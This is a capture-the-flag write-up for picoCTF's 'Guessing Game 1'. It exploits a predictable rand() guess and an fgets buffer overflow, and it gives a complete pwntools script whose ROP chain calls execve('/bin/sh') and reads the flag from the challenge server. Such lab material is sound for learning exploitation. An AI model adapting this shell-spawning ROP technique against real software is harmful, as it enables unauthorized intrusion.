---
slug: guessing_game_1
title: Guessing Game 1
authors: [nguyen]
tags: [Binary Exploitation]
---

Description:

I made a simple game to show off my programming skills. See if you can beat it!

<!--truncate-->

## The Challenge

Challenge can be found [here](https://play.picoctf.org/practice/challenge/90?page=1&search=guess)

## Analysis

Using ```checksec```, we find that the program has stack canary, partial relro, and NX enabled. The architecture is amd64 little endian.

## The Solve

Upon inspection of the source code, I saw that there is no call to ```srand()``` meaning that the value for ```rand()``` stays the same every time the program is run. We can extract the value using gdb and get ```0x53```. Incrementing this by 1 gives us the correct value ```84```. Entering this value to the program allows us to reach the ```win``` function.

```win``` contains a buffer overflow when it calls ```fgets```. I could not find the challenge flag within the executable so I used ropper to find ROP gadgets and obtain a shell.

Conditions for obtaining a shell with execve:

1. char \* filepath set to /bin/sh in rdi
2. char \* argv set to NULL in rsi
3. char \* envp set to NULL in rdx
4. value 0x3b for syscall in rax

After obtaining a shell, I was able to see that there was a flag file and ```cat``` it.

## Script

```python
"""
Toast's submission for picoGym challenge Guessing Game 1.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('jupiter.challenges.picoctf.org', 50581)
    elif args.get('GDB'):
        io = gdb.debug([exe.path])
    else:
        io = process([exe.path])

    return io


def main():
    flag = get_flag()
    log.success(flag)


def get_flag():
    '''Return the flag.
    '''
    with conn() as io:
        io.sendline(b"84")
        payload = b"A" * 120

        # 0x6ba0e0 Address of Data section
        # 0x400696 pop rdi; ret;
        payload += p64(0x400696) + p64(0x6ba0e0)

        # 0x410ca3 pop rsi; ret;
        payload += p64(0x410ca3) + b"/bin//sh"

        # 0x447d7b mov qword ptr [rdi], rsi; ret;
        payload += p64(0x447d7b)

        # 0x6ba0e8 address of DATA + 8
        # 0x410ca3 pop rsi; ret;
        payload += p64(0x410ca3) + p64(0x6ba0e8)

        # 0x6ba0e8 address of DATA + 8
        # 0x44cc26 pop rdx; ret;
        payload += p64(0x44cc26) + p64(0x6ba0e8)

        # 0x4163f4 pop rax; ret;
        payload += p64(0x4163f4) + p64(0x3b)

        # 0x40137c syscall;
        payload += p64(0x40137c)

        io.sendline(payload)

        io.recvuntil(b"\x06")
        io.recvuntil(b"@\n\n")
        io.sendline(b"cat flag.txt")
        flag = io.recvline()
        io.close()
        return flag.decode()


if __name__ == '__main__':
    main()
```
